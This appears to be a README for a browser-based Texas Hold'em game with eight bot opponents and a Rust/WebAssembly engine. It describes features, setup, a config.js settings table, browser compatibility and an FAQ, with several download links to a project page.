# pkarena0-web – Texas Hold'em Solo Arena 2026

> **A browser-based single-player poker simulation where you compete against eight AI opponents, powered by WebAssembly.**

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/jordanhub1992/pkarena0-web-poker?style=flat-square)](https://github.com/jordanhub1992/pkarena0-web-poker)

---

<p align="center">
  <a href="https://jordanhub1992.github.io/pkarena0-web-poker/">
    <img src="https://img.shields.io/badge/Download-pkarena0--web%20Script-brightgreen?style=for-the-badge" alt="Download pkarena0-web Script">
  </a>
</p>

> **[Direct Download – pkarena0-web](https://jordanhub1992.github.io/pkarena0-web-poker/)**

---

[Download Latest Build](https://jordanhub1992.github.io/pkarena0-web-poker/)

---

## What This Is

A complete Texas Hold'em poker table rendered as a standalone web page. The underlying logic runs on a Rust game engine compiled into WebAssembly. You play against eight computer-controlled opponents, each with a unique behavioral style, so every round feels distinct. The entire application runs client-side – after the first page load, no server connection or internet access is needed.

The 2026 release adds animated bot actions, hole card reveals during showdowns, and an experimental audio commentary feature. Sessions automatically end when fewer than two players remain at the table. For players who want to review their decisions, hand history can be exported as YAML files.

---

## Key Capabilities

- **Single-player Texas Hold'em** against eight AI bots with different aggression levels
- **Rust engine compiled to WASM** for fast, deterministic shuffling and decision-making
- **Fully offline** – works as a static HTML page, ideal for local hosting or air-gapped play
- **Animated bot moves** including bet, call, raise, fold, and all-in with visual indicators
- **Showdown reveals** – both hole cards are shown for every remaining player after the final round
- **Automatic session end** when only one or zero players are still active
- **YAML hand history export** for post-game analysis or external tools
- **Experimental audio narration** – optional voice commentary that follows game events

---

## Getting Started

1. Grab the latest build from the download link above.
2. Unpack the archive into a directory on your machine.
3. Launch `index.html` in any modern browser (Chrome, Firefox, Edge, Safari).
4. The game starts immediately – no installation, compilation, or web server is required.

If you want to tweak the code or run a local development server, you can serve the folder with any static file server (for example, `python -m http.server 8000`).

---

## Configuration

Several settings can be adjusted through the in-game menu or by editing `config.js` directly:

| Setting | Default | Description |
|---------|---------|-------------|
| `audioNarration` | `false` | Enables experimental voice feedback during hands |
| `animationSpeed` | `1.0` | Speed multiplier for bot action animations (range 0.5–2.0) |
| `autoFoldDelay` | `2000` | Milliseconds before an idle AI bot auto-folds |
| `exportFormat` | `yaml` | Output format for hand history (currently only YAML is supported) |

Example configuration block:

```javascript
// config.js
const settings = {
  audioNarration: false,
  animationSpeed: 1.0,
  autoFoldDelay: 2000,
  exportFormat: 'yaml'
};
```

---

## Compatibility

- **Supported browsers:** Any modern browser with WebAssembly support – Chrome 57+, Firefox 52+, Edge 16+, Safari 11+
- **Supported game variants:** All standard Texas Hold'em formats (fixed-limit, no-limit, pot-limit)
- **Known limitations:** The audio narration feature is experimental and may not function in every browser. The interface is optimized for desktop screens; mobile layouts may appear cramped.
- **No server dependency** – all processing occurs locally in the browser.

---

## Frequently Asked Questions

**How do I begin a new game?**  
Refresh the page or click the "New Game" button in the menu. A fresh table with eight AI opponents will be dealt.

**Can I modify the bot profiles?**  
Yes. Bot behavior parameters are stored in `bots.json`. You can adjust aggression levels, starting chip stacks, and bot names.

**How do I customize the game?**  
Edit `config.js` to change animation speeds, audio settings, or export preferences. For deeper modifications, alter the Rust source code and recompile to WASM.

**Does this work on phones or tablets?**  
It may run on tablets, but the interface is designed for desktop-sized screens. Touch interactions are not fully supported.

**Where are my hand histories saved?**  
Exported YAML files are downloaded to your browser's default download directory. No data is uploaded or stored on any server.

---

## License

GNU GPL v3.0 – see [LICENSE](LICENSE) for details.
